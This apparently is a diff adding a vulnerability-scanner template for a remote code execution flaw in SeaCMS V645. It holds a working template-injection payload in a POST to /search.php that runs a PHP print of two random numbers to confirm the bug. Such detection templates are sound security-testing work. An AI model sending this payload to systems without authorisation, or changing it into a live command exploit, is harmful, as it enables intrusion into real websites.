@@ -1,0 +1,18 @@
+id: seacmsv645-command-exec
+
+info:
+    name: SeaCMS V645 RCE
+    author: Facker007(https://github.com/Facker007)
+    severity: high
+
+set:
+    rand1: randomInt(200000000, 210000000)
+    rand2: randomInt(200000000, 210000000)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /search.php?searchtype=5
+            body: searchtype=5&order=}{end if} {if:1)print({{rand1}}%2b{{rand2}});if(1}{end if}
+        expression: response.body.bcontains(bytes(string(rand1 + rand2)))
+expression: r0()
